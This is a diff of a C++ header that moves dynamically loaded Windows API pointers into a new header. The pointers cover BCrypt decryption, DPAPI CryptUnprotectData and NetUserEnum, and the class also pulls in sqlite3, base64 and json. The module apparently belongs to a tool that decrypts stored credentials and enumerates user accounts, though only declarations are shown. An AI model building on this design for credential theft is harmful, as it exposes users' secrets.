@@ -7,6 +7,7 @@
 #include<LMAPIbuf.h>
 #include<bcrypt.h>
 #include<wincrypt.h>
+#include "mod_dynamic_load.hpp"
 #include "../json/json.hpp"
 #include "../sqlite3/sqlite3.h"
 #include "../base64/base64.h"
@@ -71,44 +72,6 @@ struct User_Info {
 	DWORD dwCountryCode;
 };
 
-struct st_Bcrypt {
-	//BCryptDecrypt
-	typedef NTSTATUS(WINAPI* LPBCRYPTDECRYPT)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
-	LPBCRYPTDECRYPT pBCryptDecrypt = nullptr;
-
-	//BCryptGenerateSymmetricKey
-	typedef NTSTATUS(WINAPI* LPBCRYPTGENERATESYMMETRICKEY)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
-	LPBCRYPTGENERATESYMMETRICKEY pBCryptGenerateSymmetricKey = nullptr;
-
-	//BCryptOpenAlgorithmProvider
-	typedef NTSTATUS(WINAPI* LPLPBCRYPTOPENALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
-	LPLPBCRYPTOPENALGORITHMPROVIDER pBCryptOpenAlgorithmProvider = nullptr;
-
-	//BCryptCloseAlgorithmProvider
-	typedef NTSTATUS(WINAPI* LPBCRYPTCLOSEALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE, ULONG);
-	LPBCRYPTCLOSEALGORITHMPROVIDER pBCryptCloseAlgorithmProvider = nullptr;
-
-	//BCryptSetProperty
-	typedef NTSTATUS(WINAPI* LPBCRYPTSETPROPERTY)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
-	LPBCRYPTSETPROPERTY pBCryptSetProperty = nullptr;
-};
-
-struct st_Crypt32 {
-	//CryptUnprotectData
-	typedef DPAPI_IMP BOOL(WINAPI* LPCRYPTUNPROTECTDATA)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
-	LPCRYPTUNPROTECTDATA pCryptUnprotectData = nullptr;
-};
-
-struct st_Netapi32 {
-	//NetUserEnum
-	typedef NET_API_STATUS(WINAPI* LPNETUSERENUM)(LPCWSTR, DWORD, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, PDWORD);
-	LPNETUSERENUM pNetUserEnum = nullptr;
-
-	//NetApiBufferFree
-	typedef NET_API_STATUS(WINAPI* LPNETAPIBUFFERFREE)(LPVOID);
-	LPNETAPIBUFFERFREE pNetApiBufferFree = nullptr;
-};
-
 class mod_Info {	
 	public:
 		void testData();
@@ -124,15 +87,10 @@ class mod_Info {
 
 		std::string m_GetUsersData();
 
-		mod_Info();
+		mod_Info(st_Bcrypt& _bcrypt, st_Crypt32& _crypt32, st_Netapi32& _netapi32);
 		~mod_Info();
 
 	private:
-
-		HMODULE hBCryptDLL   = NULL;
-		HMODULE hCrypt32DLL  = NULL;
-		HMODULE hNetApi32DLL = NULL;
-
 		st_Bcrypt     BCRYPT;
 		st_Crypt32   CRYPT32;
 		st_Netapi32 NETAPI32;
